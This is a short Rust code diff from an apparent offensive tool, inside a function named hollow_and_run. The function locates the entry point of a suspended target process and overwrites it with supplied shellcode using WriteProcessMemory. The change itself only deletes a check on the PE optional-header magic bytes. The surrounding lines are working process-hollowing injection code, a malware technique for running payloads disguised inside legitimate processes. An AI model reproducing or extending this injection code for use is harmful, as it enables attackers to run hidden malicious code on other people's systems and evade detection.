@@ -104,10 +104,6 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     let entry_point_rva = array_to_u32_lit_end(&header_buffer[opthdr_offset..opthdr_offset + 0x04].try_into().unwrap());
     let entry_point_address = entry_point_rva as u64 + pe_base_address;
 
-    if header_buffer[e_lfanew as usize + 0x18] != 11 || header_buffer[e_lfanew as usize + 0x19] != 2 {
-        panic!("An offset looks incorrect, the optional header magic bytes don't correspond to '0x020B'");
-    }
-
     let write_result = unsafe { WriteProcessMemory(process_handle, entry_point_address as *const c_void, shellcode.as_ptr() as *const c_void, shellcode.len(), ptr::null_mut()) };
     if !write_result.as_bool() {
         panic!("Could not write the shellcode to the suspended {target_process} with WriteProcessMemory");
